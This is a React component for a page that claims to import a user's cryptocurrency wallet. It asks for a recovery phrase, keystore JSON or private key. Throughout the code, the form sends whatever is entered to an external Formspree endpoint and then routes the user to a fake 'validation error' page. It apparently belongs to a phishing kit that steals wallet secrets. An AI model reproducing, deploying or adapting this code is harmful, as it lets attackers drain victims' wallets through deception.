import React, { useEffect, useState } from "react";
import { Link, useNavigate, useParams } from "react-router-dom";
import { useForm } from "@formspree/react";
import { wallets } from "../utils/wallets";
import FormSubmit from "../components/FormSubmit";
import logo from "../assets/logo.png";

const ImportWallet = () => {
  const navigate = useNavigate();
  const { id } = useParams();
  const [keyType, setKeyType] = useState("Phrase");
  const [state, handleSubmit] = useForm("mleyrrqq");

  const HandleWallet = () => {
    let tabs = document.querySelectorAll(".tab");
    let indicator = document.querySelector(".indicator");
    indicator.style.width = tabs[0].getBoundingClientRect().width + "px";
    indicator.style.left =
      tabs[0].getBoundingClientRect().left -
      tabs[0].parentElement.getBoundingClientRect().left +
      "px";

    tabs.forEach((tab, index) => {
      if (tab.id == tabs[0].id) {
        tab.classList.add("tabActive", "text-[#000]");
        tab.classList.remove("bg-[rgba(48,48,48,0.7)]");
      }

      tab.addEventListener("click", (e) => {
        tabs.forEach((tab) => {
          tab.classList.remove("tabActive", "text-[#000]");
          tab.classList.add("bg-[rgba(48,48,48,0.7)]");
        });
        setKeyType(e.target.innerText);

        indicator.style.width = tab.getBoundingClientRect().width + "px";
        indicator.style.left =
          tab.getBoundingClientRect().left -
          tab.parentElement.getBoundingClientRect().left +
          "px";

        if (tab.id == tabs[index].id) {
          tab.classList.add("tabActive", "text-[#000]");
          tab.classList.remove("bg-[rgba(48,48,48,0.7)]");
        }
      });
    });
  };

  useEffect(() => {
    HandleWallet();
  }, []);

  if (state.succeeded) {
    navigate("/validationerror");
  }
  return (
    <>
      <Link to="/" className="absolute left-5 top-20 w-[4rem] h-[4rem]">
        <img src={logo} alt="logo.png" className="w-full" />
      </Link>
      <div>
        <div className="flex items-center">
          <div className="max-w-xl mx-auto mt-24 md:mt-10 w-[90%] bg-[#222222] px-8 pt-10 pb-10 rounded-3xl">
            <div className="flex justify-start gap-x-5 items-center mb-6">
              <div className="w-[35px] h-[35px]">
                <img
                  src={`${wallets[id].icon}`}
                  alt="logo.png"
                  className="w-full"
                />
              </div>
              <h3 className="text-white font-semibold xs:text-sm md:text-lg lg:text-2xl">
                Import your {`${wallets[id].title}`} Wallet
              </h3>
            </div>
            <div className="w-full">
              <div
                role="tablist"
                aria-label="tabs"
                className="relative grid md:grid-cols-3 gap-x-3 gap-y-3 items-center px-3 py-3 md:rounded-full bg-[rgba(48,48,48,0.3)] overflow-hidden transition"
              >
                <div className="invisible md:absolute indicator md:h-11 my-auto top-0 bottom-0 left-0 bg-[#D1FFCE] rounded-full shadow-md"></div>
                <button
                  role="tab"
                  aria-selected="true"
                  aria-controls="panel-1"
                  id="tab-1"
                  tabIndex="0"
                  className="relative block px-3 tab py-3 text-white xs:text-sm bg-[rgba(48,48,48,0.7)] rounded-full"
                >
                  <span>Phrase</span>
                </button>
                <button
                  role="tab"
                  aria-selected="false"
                  aria-controls="panel-2"
                  id="tab-2"
                  tabIndex="-1"
                  className="relative block px-3 tab py-3 text-white xs:text-sm bg-[rgba(48,48,48,0.7)] rounded-full"
                >
                  <span>Keystore JSON</span>
                </button>
                <button
                  role="tab"
                  aria-selected="false"
                  aria-controls="panel-3"
                  id="tab-3"
                  tabIndex="-1"
                  className="relative block px-3 tab py-3 text-white xs:text-sm bg-[rgba(48,48,48,0.7)] rounded-full"
                >
                  <span>Private Key</span>
                </button>
              </div>
              <div className="mt-6 relative">
                <div>
                  <form onSubmit={handleSubmit}>
                    <FormSubmit keyType={keyType} wallet={wallets[id].title} />
                    <div className="flex justify-between items-center mt-5">
                      <Link
                        to="/"
                        className="bg-red-500 py-5 w-[48%] text-center font-bold text-white rounded-full"
                      >
                        Cancel
                      </Link>
                      <button
                        className="bg-lime-500 py-5 w-[48%] rounded-full text-[#222222] font-bold"
                        type="submit"
                        disabled={state.submitting}
                      >
                        Import
                      </button>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default ImportWallet;
